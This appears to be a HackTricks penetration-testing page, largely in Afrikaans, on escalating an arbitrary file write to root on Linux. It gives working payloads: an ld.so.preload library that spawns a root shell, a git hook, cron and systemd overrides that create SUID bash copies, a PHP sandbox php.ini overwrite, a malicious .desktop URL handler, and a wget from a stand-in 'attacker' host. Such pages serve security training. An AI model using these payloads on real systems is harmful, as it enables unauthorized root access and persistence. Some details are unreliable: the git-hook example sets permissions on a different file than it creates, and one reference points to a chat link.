# Arbitrary File Write to Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Hierdie lêer tree op soos die **`LD_PRELOAD`** env variable maar dit werk ook in **SUID binaries**.\
As jy dit kan skep of wysig, kan jy net byvoeg 'n **pad na 'n biblioteek wat met elke uitgevoerde binary gelaai sal word**.

For example: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) is **skripte** wat **uitgevoer** word op verskeie **gebeurtenisse** in 'n git repository, soos wanneer 'n commit geskep word, 'n merge... As 'n **bevoorregte skrip of gebruiker** hierdie aksies gereeld uitvoer en dit moontlik is om in die **`.git`-gids** te **skryf**, kan dit gebruik word vir **privesc**.

Byvoorbeeld, dit is moontlik om 'n **skrip te genereer** in 'n git-repo in **`.git/hooks`** sodat dit altyd uitgevoer word wanneer 'n nuwe commit geskep word:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Tydlêers

Indien jy **skryf cron-verwante lêers wat root uitvoer**, kan jy gewoonlik code execution kry die volgende keer dat die job loop. Interessante teikens sluit in:

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Root se eie crontab in `/var/spool/cron/` of `/var/spool/cron/crontabs/`
- `systemd` timers en die dienste wat hulle aktiveer

Vinnige kontroles:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Tipiese misbruikpaaie:

- **Voeg 'n nuwe root cron job by** na `/etc/crontab` of 'n lêer in `/etc/cron.d/`
- **Vervang 'n script** wat reeds deur `run-parts` uitgevoer word
- **Backdoor 'n bestaande timer target** deur die script of binary wat dit uitvoer te wysig

Minimale cron payload-voorbeeld:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
As jy slegs binne 'n cron-gids kan skryf wat deur `run-parts` gebruik word, los daar eerder 'n uitvoerbare lêer neer:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Aantekeninge:

- `run-parts` ignoreer gewoonlik lêernaammetjies met punte, dus gebruik eerder name soos `backup` in plaas van `backup.sh`.
- Sommige distros gebruik `anacron` of `systemd` timers in plaas van klassieke cron, maar die misbruik-idee is dieselfde: **wysig wat root later sal uitvoer**.

### Service & Socket files

As jy **`systemd` unit files** of lêers wat daardeur verwys word kan skryf, kan jy moontlik kode as root uitvoer deur die unit te herlaai en te herbegin, of deur te wag dat die service/socket-aktivasiestroom dit aktiveer.

Interessante teikens sluit in:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in-overskrywings in `/etc/systemd/system/<unit>.d/*.conf`
- Service skripte/binaries wat deur `ExecStart=`, `ExecStartPre=`, `ExecStartPost=` verwys word
- Skryfbare `EnvironmentFile=`-paaie wat deur 'n root-diens gelaai word

Vinnige kontroles:
```bash
ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system 2>/dev/null
```
Algemene misbruikspaaie:

- **Overwrite `ExecStart=`** in 'n service-eenheid wat aan root behoort en wat jy kan wysig
- **Add a drop-in override** met 'n kwaadwillige `ExecStart=` en verwyder eers die ou een
- **Backdoor the script/binary** wat reeds deur die unit verwys word
- **Hijack a socket-activated service** deur die ooreenstemmende `.service`-lêer te wysig wat begin wanneer die socket 'n verbinding ontvang

Voorbeeld van 'n kwaadwillige override:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Tipiese aktiveringsvloei:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
As jy nie dienste self kan herbegin nie maar 'n socket-activated unit kan wysig, hoef jy dalk net te **wag vir 'n kliëntverbinding** om die backdoored service as root te laat uitvoer.

### Oorskryf 'n beperkende `php.ini` wat deur 'n geprivilegieerde PHP sandbox gebruik word

Sommige aangepaste daemons valideer gebruikersverskafte PHP deur `php` te laat loop met 'n **beperkende `php.ini`** (byvoorbeeld, `disable_functions=exec,system,...`). As die sandboxed code nog steeds **any write primitive** het (soos `file_put_contents`) en jy by die **presiese `php.ini` path** wat deur die daemon gebruik word kan bereik, kan jy daardie config **oorskryf** om beperkings op te hef en dan 'n tweede payload indien wat met verhoogde voorregte uitgevoer word.

Tipiese verloop:

1. Eerste payload oorskryf die sandbox config.
2. Tweede payload voer kode uit nou dat gevaarlike funksies weer geaktiveer is.

Minimale voorbeeld (vervang die pad wat deur die daemon gebruik word):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Indien die daemon as root loop (of valideer met paaie wat aan root behoort), lewer die tweede uitvoering 'n root-konteks. Dit is in wese **privilege escalation via config overwrite** wanneer die sandboxed runtime nog steeds lêers kan skryf.

### binfmt_misc

Die lêer geleë in `/proc/sys/fs/binfmt_misc` dui watter binary watter tipe lêers moet uitvoer. TODO: check the requirements to abuse this to execute a rev shell when a common file type is open.

### Oorskryf skema handlers (soos http: of https:)

'n Aanvaller met skryfpermissies tot 'n slagoffer se konfigurasiegidse kan maklik lêers vervang of skep wat stelselgedrag verander, wat onbedoelde kode-uitvoering tot gevolg het. Deur die `$HOME/.config/mimeapps.list`-lêer te wysig om HTTP- en HTTPS-URL-handlers na 'n kwaadwillige lêer te verwys (bv. deur `x-scheme-handler/http=evil.desktop` te stel), verseker die aanvaller dat **klik op enige http- of https-skakel kode aktiveer soos gespesifiseer in daardie `evil.desktop`-lêer**. Byvoorbeeld, nadat die volgende kwaadwillige kode in `evil.desktop` in `$HOME/.local/share/applications` geplaas is, sal enige eksterne URL-kliek die ingesluit opdrag uitvoer:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
Vir meer inligting kyk na [**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) waar dit gebruik is om 'n werklike kwesbaarheid uit te buit.

### Root wat gebruiker-skryfbare skripte/binaries uitvoer

As 'n geprivilegieerde workflow iets soos `/bin/sh /home/username/.../script` uitvoer (of enige binary binne 'n gids wat aan 'n ongeprivilegieerde gebruiker behoort), kan jy dit kap:

- **Detecteer die uitvoering:** monitor prosesse met [pspy](https://github.com/DominicBreuker/pspy) om te vang wanneer root gebruikersbeheerde paaie aanroep:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Bevestig skryfbaarheid:** verseker dat beide die teikenlêer en sy gids deur jou gebruiker besit en skryfbaar is.
- **Kaap die teiken:** rugsteun die oorspronklike binary/script en plaas 'n payload wat 'n SUID shell (of enige ander root action) skep, en herstel dan permissies:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Aktiveer die geprivilegieerde aksie** (bv. deur 'n UI-knoppie te druk wat die helper spawn). Wanneer root die hijacked path weer uitvoer, gryp die escalated shell met `./rootshell -p`.

## Verwysings

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)

{{#include ../../banners/hacktricks-training.md}}
